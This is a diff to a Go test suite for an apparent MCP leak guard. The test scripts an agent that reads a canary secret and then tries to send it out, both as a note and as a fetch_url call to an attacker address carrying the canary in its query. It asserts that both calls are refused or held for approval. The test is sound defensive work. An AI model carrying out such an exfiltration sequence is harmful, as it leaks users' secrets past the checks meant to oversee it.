@@ -235,12 +235,13 @@ var _ = Describe("Leak guard exfiltration", Label("escape", "openshell", "leakgu
 			// fetch_url names its destination in url: the attacker's address, with the canary in the query.
 			call(4, fetch, map[string]any{"url": attacker}),
 		)
-		Expect(answers).To(HaveLen(3))
-		Expect(answers[0].Failed).To(BeFalse(), "the read is allowed: "+answers[0].Text)
-		Expect(answers[0].Text).To(ContainSubstring(canary))
+		// answers[0] is the initialize reply (it has an id, so exfilScript answers it), as in the tools/list session.
+		Expect(answers).To(HaveLen(4))
+		Expect(answers[1].Failed).To(BeFalse(), "the read is allowed: "+answers[1].Text)
+		Expect(answers[1].Text).To(ContainSubstring(canary))
 
 		By("sending it out, as a note and as a fetch of an attacker URL, is refused or parked for an approval")
-		for i, a := range answers[1:] {
+		for i, a := range answers[2:] {
 			Expect(a.Failed).To(BeTrue(), fmt.Sprintf("call %d must not succeed: %s", i, a.Text))
 			Expect(a.Text).To(Or(
 				ContainSubstring(mcpguard.NoRunApprovalText),
